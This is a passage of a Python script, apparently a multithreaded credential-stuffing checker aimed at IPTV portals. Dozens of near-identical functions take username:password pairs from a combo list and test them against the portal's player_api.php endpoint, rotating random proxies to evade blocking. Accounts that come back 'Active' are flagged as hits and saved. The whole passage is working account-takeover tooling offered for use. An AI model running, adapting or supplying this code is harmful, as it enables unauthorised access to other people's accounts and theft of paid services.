			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d32():
	global hit
	global proxy_
	say=0
	for fyz in range(32,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_32'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d33():
	global hit
	global proxy_
	say=0
	for fyz in range(33,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_33'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d34():
	global hit
	global proxy_
	say=0
	for fyz in range(34,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_34'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d35():
	global hit
	global proxy_
	say=0
	for fyz in range(35,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_35'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d36():
	global hit
	global proxy_
	say=0
	for fyz in range(36,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_36'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d37():
	global hit
	global proxy_
	say=0
	for fyz in range(37,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_37'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

                    
def d38():
	global hit
	global proxy_
	say=0
	for fyz in range(38,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_38'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d39():
	global hit
	global proxy_
	say=0
	for fyz in range(39,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_39'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d40():
	global hit
	global proxy_
	say=0
	for fyz in range(40,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_40'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d41():
	global hit
	global proxy_
	say=0
	for fyz in range(41,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_41'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d42():
	global hit
	global proxy_
	say=0
	for fyz in range(42,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_42'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d43():
	global hit
	global proxy_
	say=0
	for fyz in range(43,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_43'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d44():
	global hit
	global proxy_
	say=0
	for fyz in range(44,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_44'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d45():
	global hit
	global proxy_
	say=0
	for fyz in range(45,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_45'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d46():
	global hit
	global proxy_
	say=0
	for fyz in range(46,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_46'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d47():
	global hit
	global proxy_
	say=0
	for fyz in range(47,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_47'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d48():
	global hit
	global proxy_
	say=0
	for fyz in range(48,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_48'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d49():
	global hit
	global proxy_
	say=0
	for fyz in range(49,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_49'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


def d50():
	global hit
	global proxy_
	say=0
	for fyz in range(50,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_50'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)
                     
			 			 	
def d51():
	global hit
	global proxy_
	say=0
	for fyz in range(51,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_51'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)


            
t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)
t16= threading.Thread(target=d16)
t17= threading.Thread(target=d17)
t18= threading.Thread(target=d18)
t19= threading.Thread(target=d19)
t20= threading.Thread(target=d20)
t21= threading.Thread(target=d21)
t22= threading.Thread(target=d22)
t23= threading.Thread(target=d23)
t24= threading.Thread(target=d24)
t25= threading.Thread(target=d25)
t26= threading.Thread(target=d26)
t27= threading.Thread(target=d27)
t28= threading.Thread(target=d28)
t29= threading.Thread(target=d29)
t30= threading.Thread(target=d30)
t31= threading.Thread(target=d31)
t32= threading.Thread(target=d32)
t33= threading.Thread(target=d33)
t34= threading.Thread(target=d34)
t35= threading.Thread(target=d35)
t36= threading.Thread(target=d36)
t37= threading.Thread(target=d37)
t38= threading.Thread(target=d38)
t39= threading.Thread(target=d39)
t40= threading.Thread(target=d40)
t41= threading.Thread(target=d41)
t42= threading.Thread(target=d42)
t43= threading.Thread(target=d43)
t44= threading.Thread(target=d44)
t45= threading.Thread(target=d45)
t46= threading.Thread(target=d46)
t47= threading.Thread(target=d47)
t48= threading.Thread(target=d48)
t49= threading.Thread(target=d49)
t50= threading.Thread(target=d50)
t51= threading.Thread(target=d51)

t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t2.start()
